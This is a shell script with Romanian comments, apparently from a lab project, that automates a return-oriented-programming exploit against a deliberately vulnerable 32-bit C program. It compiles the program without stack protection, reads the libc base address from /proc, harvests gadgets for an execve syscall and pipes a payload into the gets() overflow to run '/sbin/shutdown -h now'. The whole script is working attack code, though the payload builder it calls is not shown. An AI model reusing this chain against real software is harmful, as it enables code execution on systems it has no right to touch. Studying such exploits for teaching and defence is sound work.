#! /bin/sh

# Instalarea bibliotecii necesare pentru scriptul de gasire a gaddget-urilor
pip install --quiet --user pwntools

# Scrierea variabilelor necesare apelului lui shutdown in programul vulnerabil
echo 'char str[] = "/sbin/shutdown";' >> program.c
echo 'char* f[] = {"/sbin/shutdown","-h","now",NULL};' >> program.c
# Compilarea programului vulnerabil cu protectiile dezactivate
gcc -g -w -m32 -fno-stack-protector -no-pie -O0 program.c -o program
# Stergerea variabilelor din codul sursa al programului vulnerabil
sed -i '$d' program.c
sed -i '$d' program.c
# Gasirea adreselor celor doua variabile adaugate
str=$(gdb program -ex "info address str" -ex quit | grep -oh "0x\w*")
f=$(gdb program -ex "info address f" -ex quit | grep -oh "0x\w*")
# Legarea cu debugger la programul vulnerabil
gnome-terminal -e "bash -c 'gdb program -ex start' "

sleep 3
# Gasirea pid-ului procesului pornit de debugger
proc=$(ps aux | grep program | head -2 | tail -1 | grep -o "\w*" | head -2 | tail -1)
# Gasirea numelui buffer-ului
name=$(grep -o "gets(\w*)" program.c | grep -oh "\w*" | tail -1)
# Gasirea adresei de memorie la care este incarcata biblioteca de C
libbase=$(cat /proc/$proc/maps | grep libc | grep -o "\w*" | head -1)

# Gasirea caii catre biblioteca de C
librarypath=$(find /lib32 * | grep -w "libc-2\w*" | head -1)
# Pornirea script-ului care gaseste gadget-uri in biblioteca de C si le scrie intr-un fisier
python ROPFinder.py $librarypath > rop.txt
# Cautarea gadget-urilor necesare montarii atacului
zeroeax=$(grep -oh "\w* :  xor eax, eax ; ret ;" rop.txt | head -1 | grep -oh "\w* :" | tr -d " :")
seteax=$(grep -oh "\w* :  add eax, 0xb ; ret ;" rop.txt | head -1 | grep -oh "\w* :" | tr -d " :")
popecxebx=$(grep -oh "\w* :  pop ecx ; pop ebx ; ret ;" rop.txt | head -1 | grep -oh "\w* :" | tr -d " :")
popedx=$(grep -oh "\w* :  pop edx ; ret ;" rop.txt | head -1 | grep -oh "\w* :" | tr -d " :")
syscall=$(grep -oh "\w* :  int 0x80 ;" rop.txt | head -1 | grep -oh "\w* :" | tr -d " :")
# Stergerea fisierului cu gadget-uri
rm rop.txt
# Constructia unui vector cu adresele gadget-urilor gasite ce va fi dat ca argument script-ului de construire a incarcaturii pentru atac
gadgets=($zeroeax $seteax $popecxebx $popedx $syscall)
# Dimensiunea buffer-ului vulnerabil
size=$(gdb program -ex "b overflow" -ex start -ex c -ex "p &$name" -ex quit | tail -1 | grep -oh "\[\w*\]" | grep -oh "\w*")
# Apelarea scriptului de constructie a incarcaturii cu toate argumentele necesare (dimensiunea buffer-ului, adresele variabilelor adaugate, adresa la care este incarcata
# biblioteca de C, vectorul cu adresele gadget-urilor) si trimiterea incarcaturii catre programul vulnerabil
python exploit.py $size $str $f $libbase ${gadgets[*]} | ./program
